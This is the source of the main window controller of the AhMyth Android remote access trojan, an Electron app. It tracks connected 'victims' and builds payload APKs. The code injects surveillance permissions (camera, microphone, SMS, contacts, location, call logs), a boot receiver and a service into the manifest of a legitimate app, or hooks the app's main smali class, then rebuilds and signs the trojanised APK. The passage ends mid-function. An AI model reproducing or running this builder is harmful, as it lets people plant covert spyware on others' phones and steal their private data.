var app = angular.module('myapp', []);
const {
    remote
} = require('electron');
var dialog = remote.dialog;
const {
    ipcRenderer
} = require('electron');
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var homedir = require('node-homedir');
const {
    dirname
} = require('path');
var dir = require("path");
const {
    promisify
} = require('util');
const exec = promisify(require('child_process').exec);
var xml2js = require('xml2js');
var readdirp = require('readdirp');
//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
//--------------------------------------------------------------



// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false, method: 'BOOT'
    }; //default values for binding apk

    var log = document.getElementById("log");

    $appCtrl.logs = [];

    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    $appCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Listen", port);
    };

    $appCtrl.StopListening = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Stop", port);
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = true;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:StopError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        delete viclist[index];
        $appCtrl.$apply();
    });

    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };


    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;


        $appCtrl.logs.push({
            date: new Date().toLocaleString(), msg: msg, color: fontColor
        });
        log.scrollTop = log.scrollHeight;
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    }

    // function to clear the logs each time a button is clicked,
    // this is done to keep things clean.
    $appCtrl.clearLogs = () => {
        if ($appCtrl.logs.length !== 0) {
            $appCtrl.logs = [];
        }
    }

    const architecture = process.arch;
    if (architecture === 'ia32') {
        delayedLog('[!] WARNING: AhMyth wWill Cease Support for All 32bit Systems Once Apktool reaches v3.0.0.', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('[★] Welcome to AhMyth Android R.A.T', CONSTANTS.logStatus.SUCCESS);
        delayedLog('————————————————————————————————————', CONSTANTS.logStatus.SUCCESS);
    }

    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL); //if user cancels the dialog
            } else {
                var apkName = result.filePaths[0].replace(/\\/g, "/").split('/').pop(); //get the name of the apk
                $appCtrl.Log('[¡] "' + apkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO); //when the user selects an apk
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[x] No APK Was Selected as a Template'); //if user cancels the dialog
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    // UNCOMMENT ORIGINAL CODE IF PROBLEMS ARISE.
    $appCtrl.GenerateApk = async (apkFolder) => {
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            // default permissions for the payload
            const permissions = CONSTANTS.permissions;

            // Create an array to store the selected permissions
            var selectedPermissions = [];

            // Check each checkbox and add the corresponding permission to the selectedPermissions array
            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            // If all checkboxes are unchecked, set selectedPermissions to an empty array
            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[★] Reading the Payload Manifest File...');
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                delayedLog('[★] Parsing the Payload Manifest Data...');
                const parsedData = await new Promise((resolve, reject) => {
                    xml2js.parseString(data, (parseError, parsedData) => {
                        if (parseError) {
                            reject(parseError);
                        } else {
                            resolve(parsedData);
                        }
                    });
                });

                delayedLog('[★] Inserting the Selected Payload Permissions...');
                parsedData.manifest['uses-permission'] = [];
                parsedData.manifest['uses-feature'] = [];

                // Add new permissions and features based on selectedPermissions
                selectedPermissions.forEach(permission => {
                    if (permission === 'android.hardware.camera') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera'
                            }
                        });
                    }

                    if (permission === 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera.autofocus'
                            }
                        });
                    }

                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-permission'].push({
                            $: {
                                'android:name': permission
                            }
                        });
                    }
                });

                // Convert the parsed data back to XML
                const builder = new xml2js.Builder();
                const updatedData = builder.buildObject(parsedData);
                await fs.promises.writeFile(
                    dir.join(CONSTANTS.ahmythApkFolderPath,
                        'AndroidManifest.xml'),
                    updatedData,
                    'utf8'
                );

            } catch (error) {
                delayedLog('[x] Error occurred while processing the Payload Manifest:',
                    CONSTANTS.logStatus.FAIL);
                writeErrorLog(error);
                delayedLog('[¡] Error written to "Error.log" on',
                    CONSTANTS.logStatus.INFO);
                delayedLog(logPath,
                    CONSTANTS.logStatus.INFO);
                return;
            }
        }

        try {
            delayedLog('[★] Emptying the Apktool Framework Directory...');
            exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        // Build the AhMyth Payload APK
        delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
        var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
            CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
        exec(createApk,
            (error, stdout, stderr) => {
                if (error !== null) {
                    delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Building');
                    delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
                var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                exec(signApk, (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Signing');
                        delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                        if (err) throw err;

                        delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                        delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                        delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
                        delayedLog();

                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                            if (err) throw err;
                        });
                    });
                });
            });
    };

    // function to create the smali payload directory for storing ahmyth payload directories and files when binding
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[★] Reading the Decompiled Original Application...')
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[★] Creating the ${payloadSmaliFolder} Directory...`);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[x] Unable to Create the ${payloadSmaliFolder} Directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying');
                        delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying "android" directory');
                            delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying "androidx" directory');
                                delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories (CHANGE TO 'fs.rmDir' of problems arise)
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with Apk generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    }

    $appCtrl.modifyManifest = (data, callback) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");

        // default permissions for the payload
        const permissions = CONSTANTS.permissions;

        // Create an array to store the selected permissions
        var selectedPermissions = [];

        // Check each checkbox and add the corresponding permission to the selectedPermissions array
        if (checkBoxofCamera.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
        }
        if (checkBoxofStorage.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
        }
        if (checkBoxofMic.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
        }
        if (checkBoxofLocation.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
        }
        if (checkBoxofContacts.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
        }
        if (checkBoxofSms.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
        }
        if (checkBoxofCallsLogs.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
        }

        // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            checkBoxofCamera.checked &&
            checkBoxofStorage.checked &&
            checkBoxofMic.checked &&
            checkBoxofLocation.checked &&
            checkBoxofContacts.checked &&
            checkBoxofSms.checked &&
            checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            !checkBoxofCamera.checked &&
            !checkBoxofStorage.checked &&
            !checkBoxofMic.checked &&
            !checkBoxofLocation.checked &&
            !checkBoxofContacts.checked &&
            !checkBoxofSms.checked &&
            !checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        delayedLog('[★] Parsing the Android Manifest XML Data...');

        // Convert data to a string if it's not already a string
        if (typeof data !== 'string') {
            data = data.toString();
        }

        xml2js.parseString(data, {
            explicitArray: false
        }, (err, result) => {
            if (err) {
                const callbackErrors = [
                    '[x] Unable to Parse the Android Manifest XML Data!',
                    '[¡] Error written to "Parsing.log" on ' + CONSTANTS.logStatus.INFO,
                    logPath,
                ];
                writeErrorLog(err, 'Parsing.log');
                callback({
                    message: callbackErrors[0],
                    callbackErrors,
                });
                return;
            }

            const manifestObj = result.manifest;

            // Check if receiver and service properties are arrays
            if (!Array.isArray(manifestObj.application.receiver)) {
                manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver] : [];
            }

            if (!Array.isArray(manifestObj.application.service)) {
                manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service] : [];
            }

            // store existing permissions
            const existingPermissions = new Set();

            // Check if permissions already exist in the manifest
            if (manifestObj['uses-permission']) {
                if (!Array.isArray(manifestObj['uses-permission'])) {
                    manifestObj['uses-permission'] = [manifestObj['uses-permission']];
                }
                manifestObj['uses-permission'].forEach((permission) => {
                    existingPermissions.add(permission.$['android:name']);
                });
            } else {
                manifestObj['uses-permission'] = [];
            }

            // Check if features already exist in the manifest
            if (manifestObj['uses-feature']) {
                if (!Array.isArray(manifestObj['uses-feature'])) {
                    manifestObj['uses-feature'] = [manifestObj['uses-feature']];
                }
                manifestObj['uses-feature'].forEach((feature) => {
                    existingPermissions.add(feature.$['android:name']);
                });
            } else {
                manifestObj['uses-feature'] = [];
            }

            // Filter selected permissions to exclude duplicates
            const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
                return self.indexOf(permission) === index && !existingPermissions.has(permission);
            });

            delayedLog('[★] Injecting AhMyth Payload Permissions...');

            // Add new permissions and features based on filteredPermissions
            filteredPermissions.forEach(permission => {
                if (permission === 'android.hardware.camera') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission === 'android.hardware.camera.autofocus') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera.autofocus'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                    manifestObj['uses-permission'].push({
                        $: {
                            'android:name': permission
                        },
                        _: '' // Add empty string as element text
                    });
                }
            });

            delayedLog('[★] Injecting AhMyth Payload Service and Receiver...');

            // Construct the receiver and service tags using constants
            const receiverTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'true',
                    'android:name': CONSTANTS.ahmythReceiver,
                },
                'intent-filter': {
                    action: {
                        $: {
                            'android:name': 'android.intent.action.BOOT_COMPLETED',
                        },
                    },
                },
            };

            const serviceTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'false',
                    'android:name': CONSTANTS.ahmythService,
                },
            };

            // Add the receiver and service tags to the application node
            manifestObj.application.receiver.push(receiverTag);
            manifestObj.application.service.push(serviceTag);

            const builder = new xml2js.Builder({
                renderOpts: {
                    pretty: true,
                    indent: '    '
                },
                headless: true
            });

            // Modify the parsed object by finding and updating the closing application tag
            const closingAppTag = '</application>';
            const modifiedClosingAppTag = '\n  </application>';
            const xmlString = builder.buildObject(result);
            const modifiedXml = xmlString.replace(closingAppTag,
                modifiedClosingAppTag);

            // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
            const closingManifestTag = '</manifest>';
            const finalModifiedXml = modifiedXml.replace(closingManifestTag,
                '</manifest>');

            callback(null,
                finalModifiedXml);
        });
    };

    $appCtrl.bindOnBoot = (apkFolder) => {
        const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');

        delayedLog('[★] Reading the Android Manifest XML File...')
        fs.readFile(manifestPath, 'utf8', (error,
            data) => {
            if (error) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            $appCtrl.modifyManifest(data, (err, finalModifiedXml) => {
                if (err) {
                    // Handle the error and print the callback errors
                    delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                    if (err.callbackErrors) {
                        err.callbackErrors.forEach((errorMsg) => {
                            delayedLog(errorMsg, CONSTANTS.logStatus.FAIL);
                        });
                    }
                    return;
                }

                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
                fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injections back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Writing.log');
                        delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder)
                });
            });
        });
    };

    // "Bind On Activity" method
    $appCtrl.bindOnActivity = (apkFolder) => {
        const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');

        delayedLog('[★] Reading the Android Manifest XML File...');
        fs.readFile(manifestPath, 'utf8', (error, data) => {
            if (error) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            $appCtrl.modifyManifest(data, (err, finalModifiedXml) => {
                if (err) {
                    // Handle the error and print the callback errors
                    delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                    if (err.callbackErrors) {
                        err.callbackErrors.forEach((errorMsg) => {
                            delayedLog(errorMsg, CONSTANTS.logStatus.FAIL);
                        });
                    }
                    return;
                }

                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
                fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injection back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Writing.log');
                        delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Reading the Modified Android Manifest XML File...')
                    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Unable to Read the Modified Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Reading.log');
                            delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        delayedLog('[★] Parsing the Modified Android Manifest XML Data...')
                        xml2js.parseString(data, (err, result) => {
                            if (err) {
                                delayedLog('[x] Unable to Parse the Modified Android Manifest XML Data!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(err, 'Parsing.log');
                                delayedLog('[¡] Error written to "Parsing.log" on ', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            const launcherActivity = getLauncherActivity(result, apkFolder);
                            if (launcherActivity === -1) {
                                delayedLog('[x] Cannot Locate a Suitable Main Class in the Manifest!', CONSTANTS.logStatus.FAIL);
                                delayedLog('[x] Please use Another APK as a Template!.', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            delayedLog('[★] Locating the Main Class Smali File...');
                            const launcherPath = getLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                                if (err) {
                                    delayedLog('[x] Unable to Locate the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                    delayedLog('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                                    return;
                                } else {
                                    delayedLog('[¡] Main Class Smali File Found: ' + launcherPath, CONSTANTS.logStatus.INFO);
                                }

                                delayedLog('[★] Reading the Main Class Smali File...');
                                fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                    if (error) {
                                        delayedLog('[x] Unable to Read the Main Smali Class File!', CONSTANTS.logStatus.FAIL);
                                        writeErrorLog(error, 'Reading.log');
                                        delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                        return;
                                    }

                                    const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                                    var hook = CONSTANTS.hookPoint;

                                    delayedLog('[★] Injecting AhMyth Hook into the Main Class Smali File...');

                                    var output = data.replace(hook, startService);
                                    fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                        if (error) {
                                            delayedLog('[x] Unable to Hook the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                            writeErrorLog(error, 'Writing.log');
                                            delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                            return;
                                        }

                                        delayedLog('[★] Reading the Target SDK Version in the Manifest...');
                                        fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                                            if (error) {
                                                delayedLog('[x] Unable to Read the Target SDK Version in the Manifest!', CONSTANTS.logStatus.FAIL);
                                                writeErrorLog(error, 'Reading.log');
                                                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                return;
                                            }

                                            delayedLog('[★] Modifying the Target SDK Version in the Manifest...');

                                            var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                            var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                            var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                            var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;

                                            var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                                .replace(compSdkVerNameRegex, "$111" + '"')
                                                .replace(platVerCoRegex, "$122" + '"')
                                                .replace(platVerNameRegex, "$111" + '"');

                                            fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), repXmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    delayedLog('[x] Unable to Modify the Target SDK in the Manifest!', CONSTANTS.logStatus.FAIL);
                                                    writeErrorLog(error, 'Writing.log');
                                                    delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                    return;
                                                }
                                                delayedLog('[★] Reading the Target SDK Version in the "apktool.yml" File...')
                                                fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                                    if (error) {
                                                        delayedLog('[x] Unable to Read the Target SDK version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                        writeErrorLog(error, 'Reading.log');
                                                        delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                                                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                        return;
                                                    }
                                                    delayedLog('[★] Modifying the Target SDK Version in the "apktool.yml" File...')
                                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                                    var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                                        .replace(tarSdkRegex, "$122'");

                                                    fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                        if (error) {
                                                            delayedLog('[x] Unable to Modify the Target SDK Version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                            writeErrorLog(error, 'Writing.log');
                                                            delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                                                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                            return;
                                                        }
                                                        $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder);
                                                    });
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
    };

    // fired when user click build buttom
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        // Check Java version before proceeding
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                $appCtrl.Log('[x] ' + error.message, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] AhMyth Requires Java 11 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
                return;
            } else if (javaVersion !== 11) {
